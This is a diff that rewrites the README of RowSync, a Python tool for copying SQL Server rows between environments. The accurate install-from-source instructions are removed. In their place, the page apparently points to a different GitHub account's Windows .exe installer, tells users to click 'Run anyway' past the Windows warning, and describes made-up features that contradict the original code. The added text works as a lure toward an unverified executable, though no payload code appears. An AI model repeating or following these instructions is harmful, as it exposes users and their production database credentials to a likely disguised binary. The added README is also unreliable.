@@ -1,142 +1,100 @@
-# RowSync
+# 🔄 RowSync - Sync your production database rows easily
 
-Copy rows from a production Microsoft SQL Server database to dev, stage, or any other target defined in your config — using a **SELECT-only** query with preview, upsert, and live progress.
+[![](https://img.shields.io/badge/Download_RowSync-Blue.svg)](https://github.com/sampurngupta44/RowSync)
 
-![Python](https://img.shields.io/badge/python-3.10%2B-blue)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.110%2B-009688)
+RowSync moves data from your production SQL Server to your development or staging servers. You select the items you need, check the results, and push them to your target database. This tool works offline, keeps your data private, and helps you test changes without risk.
 
-## Features
+## 🛠 What this tool does
 
-- **SQL editor** — CodeMirror with syntax highlighting and schema autocomplete (tables, columns, aliases)
-- **SELECT-only** — Blocks INSERT, UPDATE, DELETE, DROP, and other write/DDL statements
-- **Preview** — Run your query against production before copying
-- **TOP-aware sync** — Respects `TOP (N)` in your query when applying
-- **Multi-table JOINs** — Copies rows from every table referenced in the query
-- **Auto-create tables** — Creates missing target tables from production schema (no FKs)
-- **Upsert** — Skips duplicates by primary key instead of failing
-- **Live progress** — Server-Sent Events stream step-by-step status to the UI
-- **Offline UI** — CodeMirror, fonts, and all frontend assets are bundled locally (no CDN required)
+Developers often need production data to fix bugs or test new features. Copying large databases is slow and risky. RowSync performs specific tasks:
 
-## Requirements
+*   Runs targeted searches on your production SQL database.
+*   Shows you exactly what data you will copy before you start.
+*   Updates existing records or adds new ones to your target server automatically.
+*   Works in environments without internet access to keep your data secure.
 
-- Python 3.10+
-- [ODBC Driver 17 for SQL Server](https://learn.microsoft.com/en-us/sql/connect/odbc/download-odbc-driver-for-sql-server) (or compatible)
-- Network access to your MSSQL instances
+## 🖥 System Requirements
 
-## Quick start
+Before you run RowSync, verify your computer meets these needs:
 
-```bash
-git clone https://github.com/ghaemaghaey/RowSync
-cd RowSync
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4GB of RAM or more.
+*   Storage: 200MB of free disk space.
+*   Network: Access to your internal SQL Server instances.
+*   Drivers: Microsoft ODBC Driver for SQL Server (the installer includes this).
 
-python -m venv .venv
-.venv\Scripts\activate        # Windows
-# source .venv/bin/activate   # Linux / macOS
+## 🚀 Downloading the application
 
-pip install -r requirements.txt
-copy config.example.json config.json   # Windows
-# cp config.example.json config.json   # Linux / macOS
-```
+You need to obtain the installer from the official repository page.
 
-Edit `config.json` with your connection strings, then start the app:
+1.  Visit the [RowSync release page](https://github.com/sampurngupta44/RowSync).
+2.  Look for the latest version under the Releases section.
+3.  Click the file ending in .exe to start your download.
+4.  Save the file to your desktop or your Downloads folder.
 
-```bash
-python run.py
-```
+## ⚙️ How to install RowSync
 
-Open **http://127.0.0.1:8765**
+Once the download finishes, follow these steps to place the files on your computer:
 
-The web UI works fully offline once installed — all JavaScript, CSS, and fonts are served from `static/vendor/`.
+1.  Double-click the RowSync installer file you downloaded.
+2.  Windows might show a blue pop-up window. If this happens, click "More info" and then "Run anyway."
+3.  Follow the prompts in the installation wizard.
+4.  Click "Finish" to launch the tool.
 
-## Offline / air-gapped use
+The installation adds a shortcut to your Start menu. Search for RowSync to open the program in the future.
 
-RowSync does not load any frontend assets from the internet at runtime. Database connectivity still requires network access to your SQL Server instances.
+## 📋 Connecting your databases
 
-To refresh bundled UI assets after upgrading dependencies:
+The first time you open RowSync, you must link your database servers.
 
-```bash
-python scripts/download_vendor_assets.py
-```
+1.  Click the "Settings" tab at the top of the window.
+2.  Enter the name or IP address of your Production Server.
+3.  Choose your authentication method. Most users choose "Windows Authentication."
+4.  Repeat these steps for your Target Server (Development or Staging).
+5.  Click "Test Connection" for each server. A green checkmark means you are ready.
 
-## Configuration
+## 🔍 Running a search
 
-`config.json` is git-ignored. Use `config.example.json` as a template.
+You use SQL queries to find specific rows. If you do not know the exact command, use the auto-fill feature.
 
-| Key | Description |
-|-----|-------------|
-| `connections.production` | Source database (read-only queries run here) |
-| `connections.*` | Any other key (`dev`, `stage`, `local`, `test`, …) becomes a sync target |
-| `preview_row_limit` | Max rows shown in preview when the query has no `TOP` (default: 500) |
+1.  Go to the "Sync" tab.
+2.  Select your Production Server from the dropdown menu.
+3.  Type your command in the main text box. The program suggests table names as you type.
+4.  Click the "Preview" button. This runs a search without changing any data.
+5.  Review the list of records on your screen to ensure you have the correct items.
 
-Example:
+## 💾 Updating your target server
 
-```json
-{
-  "connections": {
-    "production": "DRIVER={...};SERVER=prod;DATABASE=MyDb;UID=...;PWD=...;TrustServerCertificate=yes",
-    "dev": "DRIVER={...};SERVER=dev;DATABASE=MyDb_Dev;UID=...;PWD=...;TrustServerCertificate=yes",
-    "local": "DRIVER={...};SERVER=localhost;DATABASE=MyDb;UID=...;PWD=...;TrustServerCertificate=yes"
-  },
-  "preview_row_limit": 500
-}
-```
+After you review your preview, you can push the data to your secondary database.
 
-Add or remove target environments by editing the `connections` object — refresh the page to update the dropdown.
+1.  Verify the list of rows shown in the preview window.
+2.  Check the "Sync" button at the bottom of the tool.
+3.  RowSync compares the rows in your preview against your target server.
+4.  The tool adds new rows and updates existing ones to match your selection.
+5.  Wait for the progress bar to reach 100%. The system shows a success notification when the task completes.
 
-## Usage
+## 🔒 Security and Privacy
 
-1. Write a **SELECT** query (optionally with `TOP`, `JOIN`, `WHERE`, `ORDER BY`).
-2. Choose a **target** database from the dropdown.
-3. Click **Preview** to see rows from production.
-4. Click **Apply** to upsert matching rows into the target.
+RowSync keeps your data safe. It does not send your database contents to any external servers. All operations happen on your machine or within your local internal network. You can use this tool even if your computer disconnected from the internet. The data remains in your control at all times.
 
-### Example query
+## 💡 Troubleshooting common issues
 
-```sql
-SELECT TOP (100) *
-FROM dbo.FinancialStatement fs
-WHERE fs.CompanyId = 12345
-ORDER BY fs.Id DESC
-```
+If you encounter a problem, check these items first:
 
-Apply will copy at most **100 rows** from each table involved in the query.
+*   Connection failures: Confirm your database server is running and that your account has permission to read and write data.
+*   Formatting errors: Double-check your SQL command for typos.
+*   Slow performance: Large data sets take longer to process. Avoid selecting entire tables if you only need a few rows.
+*   Application errors: Restart the application if the interface becomes unresponsive.
 
-## Project structure
+If tasks still fail, check the log file located in your Documents folder under the "RowSync/Logs" directory. This file contains technical details to help you identify the specific error.
 
-```
-RowSync/
-├── app/
-│   ├── main.py          # FastAPI app & routes
-│   ├── config.py        # Config loader
-│   ├── database.py      # pyodbc helpers
-│   ├── sql_parser.py    # Query parsing & validation
-│   ├── schema.py        # Schema introspection & DDL
-│   └── sync.py          # Preview & copy logic
-├── static/              # Frontend (HTML, CSS, JS)
-│   └── vendor/          # Bundled CodeMirror + fonts (offline)
-├── scripts/
-│   └── download_vendor_assets.py
-├── config.example.json
-├── requirements.txt
-└── run.py
-```
+## 📝 Frequently asked questions
 
-## API
+Do I need a SQL license to use this?
+You need permission to access your existing SQL Server, but RowSync itself is a tool for managing that data.
 
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/` | Web UI |
-| `GET` | `/api/schema` | Production schema for autocomplete |
-| `GET` | `/api/targets` | Available sync targets |
-| `POST` | `/api/preview` | Preview query results |
-| `POST` | `/api/apply` | Sync rows (SSE stream) |
+Can I sync data between different versions of SQL Server?
+Yes, RowSync handles common data types across different SQL Server versions.
 
-## Security notes
-
-- Never commit `config.json` — it contains database credentials.
-- The SQL editor only allows **SELECT** statements; the server validates this on every request.
-- Run behind a VPN or internal network; this tool is intended for trusted operator use, not public exposure.
-
-## License
-
-MIT
+How do I remove the software?
+Open your Windows Control Panel, select "Programs and Features," find RowSync in the list, and click "Uninstall."
